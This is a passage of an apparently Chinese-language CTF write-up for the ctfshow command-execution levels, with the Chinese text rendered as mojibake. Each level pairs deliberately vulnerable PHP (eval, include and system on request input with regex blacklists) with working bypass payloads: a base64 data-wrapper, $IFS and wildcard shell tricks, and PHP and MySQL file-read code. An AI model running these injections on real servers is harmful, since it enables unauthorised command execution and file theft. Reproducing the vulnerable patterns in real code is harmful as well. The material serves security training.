class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag|php|file/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜æ˜¯èƒ½å¤Ÿç”¨dataä¼ªåè®®ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=data:text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure><p>è¿˜å¯ä»¥åœ¨UAå†™å…¥ä¸€å¥è¯ï¼ŒåŒ…å«æ—¥å¿—æ–‡ä»¶</p><h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\'|\"|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>é™¤äº†å­—æ¯ï¼Œä¸€äº›ç‰¹æ®Šå­—ç¬¦åŸºæœ¬éƒ½è¢«è¿‡æ»¤äº†</p><p>è¿™é“é¢˜å’ŒGXYç¦æ­¢å¥—å¨ƒè§£æ³•ç›¸åŒï¼Œåˆ©ç”¨ç‰¹æ®Šçš„å‡½æ•°è¿›è¡Œç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line">c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">å…·ä½“å‡½æ•°åŠŸèƒ½çœ‹æœ€å‰éƒ¨åˆ†</span><br></pre></td></tr></table></figure><h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ¶‰åŠåˆ°linuxå‘½ä»¤ä¸­çš„åˆ†éš”ç¬¦ï¼Œå‰é¢æ€»ç»“ä¸­æœ‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=ls;</span><br><span class="line">c=cat flag.php;||c=cat f*;</span><br></pre></td></tr></table></figure><h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†åˆ†éš”ç¬¦å¼•å·å’Œæ–‡æœ¬è¯»å–cat</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=ls||</span><br><span class="line">c=c\at f*||</span><br></pre></td></tr></table></figure><h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/;|cat|flag/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¤šè¿‡æ»¤äº†flagï¼Œé€šé…ç¬¦å³å¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=ls||</span><br><span class="line">c=c\at f*||</span><br></pre></td></tr></table></figure><h3 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| /i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¤šäº†ä¸ªç©ºæ ¼è¢«è¿‡æ»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at%<span class="number">09</span>f*||</span><br></pre></td></tr></table></figure><h3 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*/i"</span>, $c))&#123;</span><br><span class="line">    system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¢åŠ æ•°å­—è¿‡æ»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at&lt;&gt;f%<span class="number">27</span>%<span class="number">27</span>lag.php||</span><br><span class="line">c=nl&lt;fl<span class="string">''</span>ag.php||</span><br></pre></td></tr></table></figure><h3 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢˜çš„payloadèƒ½æ‰“é€š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at&lt;&gt;f%<span class="number">27</span>%<span class="number">27</span>lag.php||</span><br></pre></td></tr></table></figure><h3 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åŒä¸Šé¢˜payloadï¼Œå¢åŠ çš„è¿‡æ»¤æ— å½±å“</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at&lt;&gt;f%<span class="number">27</span>%<span class="number">27</span>lag.php||</span><br></pre></td></tr></table></figure><h3 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¤šè¿‡æ»¤äº†ç™¾åˆ†å·ï¼ŒåŒä¸Šé¢˜</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at&lt;&gt;f%<span class="number">27</span>%<span class="number">27</span>lag.php||</span><br></pre></td></tr></table></figure><h3 id="web50-51"><a href="#web50-51" class="headerlink" title="web50-51"></a>web50-51</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¢åŠ åå…­è¿›åˆ¶å¯¹åˆ¶è¡¨ç¬¦ç­‰çš„è¿‡æ»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at&lt;&gt;f%<span class="number">27</span>%<span class="number">27</span>lag.php||</span><br></pre></td></tr></table></figure><h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†å°–æ‹¬å·ï¼Œç©ºæ ¼æ¢ç§æ–¹å¼ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at$IFS/fl%<span class="number">27</span>%<span class="number">27</span>ag||</span><br></pre></td></tr></table></figure><h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">echo</span>($c);</span><br><span class="line">        $d = system($c);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>.$d;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ”¹å˜äº†å½¢å¼ï¼Œä¸å†éœ€è¦å‘½ä»¤åˆ†éš”ç¬¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at$&#123;IFS&#125;fl%<span class="number">27</span>%<span class="number">27</span>ag.php</span><br></pre></td></tr></table></figure><h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿‡æ»¤å¾ˆä¸¥æ ¼ï¼Œä½†æ˜¯ä¾æ—§å¯ä»¥ç»•è¿‡ï¼Œç”¨é€šé…ç¬¦å’Œbash</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=/bin/?at$&#123;IFS&#125;f???????</span><br></pre></td></tr></table></figure><h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[@-[]æ˜¯linuxä¸‹çš„åŒ¹é…ç¬¦ï¼Œæ˜¯è¿›è¡ŒåŒ¹é…çš„å¤§å†™å­—æ¯</span><br></pre></td></tr></table></figure><p>èµ·ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„ç½‘é¡µï¼Œä¸Šä¼ æ–‡ä»¶æŠ“ä¸ªåŒ…ï¼Œå…·ä½“çŸ¥è¯†ç‚¹çœ‹æˆªå›¾</p><img src="/2020/09/22/ctfshowcommand/1.png" class=""><h3 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\'|\"|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è§£æ³•è·Ÿ55åŒ</p><h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i"</span>, $c))&#123;</span><br><span class="line">        system(<span class="string">"cat "</span>.$c.<span class="string">".php"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ ¹æ®æç¤ºflagåœ¨36.phpæ–‡ä»¶ä¸­ï¼Œæ— å­—æ¯æ•°å­—æ„é€ å‡º36</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line"><span class="comment">#$((~$(()))) -1</span></span><br><span class="line"><span class="comment">#$((~$(($((~$(())))$((~$(()))))))) 1</span></span><br><span class="line"><span class="comment">#$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span></span><br></pre></td></tr></table></figure><h3 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»è¿‡æµ‹è¯•ï¼Œå‘ç°å‘½ä»¤æ‰§è¡Œå‡½æ•°åŸºæœ¬ä¸Šéƒ½è¢«banäº†ï¼Œè¿™é‡Œè¦å¯»æ‰¾å…¶ä»–æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=show_source(<span class="string">"flag.php"</span>);</span><br><span class="line">c=highlight_file(<span class="string">"flag.php"</span>);</span><br><span class="line">å…¶ä»–å¸ˆå‚…çš„å§¿åŠ¿</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">"flag.php"</span>);          </span><br><span class="line">readfile(<span class="string">"flag.php"</span>);</span><br></pre></td></tr></table></figure><h3 id="web59-web65"><a href="#web59-web65" class="headerlink" title="web59-web65"></a>web59-web65</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=highlight_file(<span class="string">"flag.php"</span>);<span class="comment">#é€šæ€</span></span><br><span class="line">c=show_source(<span class="string">"flag.php"</span>);<span class="comment">#é€šæ€</span></span><br><span class="line">ä¸‹é¢çš„payloadæ¥è‡ª_yu_å¸ˆå‚…ï¼ˆæ„Ÿè°¢ï¼‰</span><br><span class="line">é€šè¿‡fopenè¯»æ–‡ä»¶å†…å®¹ï¼š</span><br><span class="line">å‡½æ•°ï¼š</span><br><span class="line">fread()</span><br><span class="line">fgets()</span><br><span class="line">fgetc()</span><br><span class="line">fgetss()</span><br><span class="line">fgetcsv()</span><br><span class="line">gpassthru()</span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">while</span> (!feof($a)) &#123;$line = fgetss($a);<span class="keyword">echo</span> $line;&#125;       <span class="comment">//php7.3ç‰ˆæœ¬å è¯¥å‡½æ•°å·²ä¸å†è¢«ä½¿ç”¨</span></span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">echo</span> fpassthru($a);                                      <span class="comment">//è¿‡59</span></span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">echo</span> fread($a,<span class="string">"1000"</span>);                                   <span class="comment">//è¿‡59</span></span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">while</span> (!feof($a)) &#123;$line = fgets($a);<span class="keyword">echo</span> $line;&#125;        <span class="comment">//è¿‡59</span></span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">while</span> (!feof($a)) &#123;$line = fgetc($a);<span class="keyword">echo</span> $line;&#125;        <span class="comment">//è¿‡60</span></span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">while</span> (!feof($a)) &#123;$line = fgetcsv($a);print_r($line);&#125;  <span class="comment">//è¿‡60</span></span><br><span class="line">å•ä¸€å‡½æ•°è¯»æ–‡ä»¶å†…å®¹ï¼š</span><br><span class="line">å‡½æ•°ï¼š</span><br><span class="line">file_get_contents()</span><br><span class="line">readfile()</span><br><span class="line">file()</span><br><span class="line">ç”¨æ³•ï¼š</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"flag.php"</span>);           <span class="comment">//è¿‡58</span></span><br><span class="line">readfile(<span class="string">"flag.php"</span>);                         <span class="comment">//è¿‡58</span></span><br><span class="line">print_r(file(<span class="string">"flag.php"</span>));                    <span class="comment">//è¿‡59</span></span><br><span class="line">é€šè¿‡å¤åˆ¶ï¼Œé‡å‘½åè¯»å–phpæ–‡ä»¶å†…å®¹ï¼ˆå‡½æ•°æ‰§è¡Œåï¼Œè®¿é—®url/flag.txtï¼‰</span><br><span class="line">å‡½æ•°ï¼š</span><br><span class="line">copy()</span><br><span class="line">rename()</span><br><span class="line">ç”¨æ³•ï¼š</span><br><span class="line">copy(<span class="string">"flag.php"</span>,<span class="string">"flag.txt"</span>);             <span class="comment">//è¿‡60</span></span><br><span class="line">rename(<span class="string">"flag.php"</span>,<span class="string">"flag.txt"</span>);           <span class="comment">//è¿‡60</span></span><br></pre></td></tr></table></figure><h3 id="web66-web70"><a href="#web66-web70" class="headerlink" title="web66-web70"></a>web66-web70</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¸å¿ƒä»£ç éƒ¨åˆ†æ²¡æœ‰æ”¹å˜ï¼Œå˜å¾—æ˜¯æ–‡ä»¶ä½ç½®ï¼Œéœ€è¦å¯¹ç›®å½•ç»“æ„è¿›è¡Œæ‰«æ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=var_dump(scandir(<span class="string">"/"</span>));highlight_file(<span class="string">"/flag.txt"</span>);</span><br><span class="line">c=var_dump(scandir(<span class="string">"/"</span>));<span class="keyword">include</span>(<span class="string">"/flag.txt"</span>);</span><br><span class="line"><span class="comment">#ç”±äºåé¢çš„æ–‡ä»¶éƒ½æ˜¯txtæ–‡ä»¶ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç”¨includeè¿›è¡ŒåŒ…å«</span></span><br><span class="line"></span><br><span class="line">c=var_dump(scandir(<span class="string">"/"</span>));highlight_file(<span class="string">"/flag.txt"</span>);          <span class="comment">//è¿‡66-67                              </span></span><br><span class="line">c=$a=opendir(<span class="string">"/"</span>); <span class="keyword">while</span> (($file = readdir($a)) !== <span class="keyword">false</span>)&#123;<span class="keyword">echo</span> $file . <span class="string">"&lt;br&gt;"</span>; &#125;;highlight_file(<span class="string">"/flag.txt"</span>);                       <span class="comment">//è¿‡66-67</span></span><br></pre></td></tr></table></figure><h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">"/[0-9]|[a-z]/i"</span>,<span class="string">"?"</span>,$s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ä»£ç åšå‡ºäº†å°å˜åŒ–</p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œä¼šæŠŠè¯»åˆ°çš„å†…å®¹æ”¾åˆ°å†…å­˜å½“ä¸­ï¼Œå¹¶ä¸”ä¼šè¾“å‡ºè¿›è¡Œäº†æ­£åˆ™æ›¿æ¢åçš„å†…å®¹ï¼Œè¿˜æ˜¯æœ‰æ–¹æ³•è¿›è¡Œç»•è¿‡ï¼Œè®©ç¨‹åºæå‰ç»“æŸé€€å‡ºå³å¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">"/flag.txt"</span>);<span class="keyword">exit</span>();||c=<span class="keyword">include</span>(<span class="string">"/flag.txt"</span>);<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><h3 id="web72-çœ‹-yu-å¸ˆå‚…çš„blog"><a href="#web72-çœ‹-yu-å¸ˆå‚…çš„blog" class="headerlink" title="web72(çœ‹_yu_å¸ˆå‚…çš„blog)"></a>web72(çœ‹_yu_å¸ˆå‚…çš„blog)</h3><h3 id="web73-74"><a href="#web73-74" class="headerlink" title="web73-74"></a>web73-74</h3><h3 id="web75-web76"><a href="#web75-web76" class="headerlink" title="web75-web76"></a>web75-web76</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">åˆ©ç”¨mysql load_fileè¯»æ–‡ä»¶   <span class="comment">//è¿‡75,76</span></span><br><span class="line">è¯»å–ç›®å½•</span><br><span class="line">$a=<span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///*"</span>);<span class="keyword">foreach</span>($a <span class="keyword">as</span> $f)&#123;<span class="keyword">echo</span>($f-&gt;__toString().<span class="string">' '</span>);&#125;;</span><br><span class="line"></span><br><span class="line">è¯»å–æ–‡ä»¶</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  $dbh = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=ctftraining'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>);</span><br><span class="line">  <span class="keyword">foreach</span>($dbh-&gt;query(<span class="string">'select load_file("/var/www/html/index.php")'</span>) <span class="keyword">as</span> $row) &#123;</span><br><span class="line">      <span class="keyword">echo</span>($row[<span class="number">0</span>]).<span class="string">"|"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  $dbh = <span class="keyword">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException $e) &#123;</span><br><span class="line">  <span class="keyword">echo</span> $e-&gt;getMessage();</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="web77"><a href="#web77" 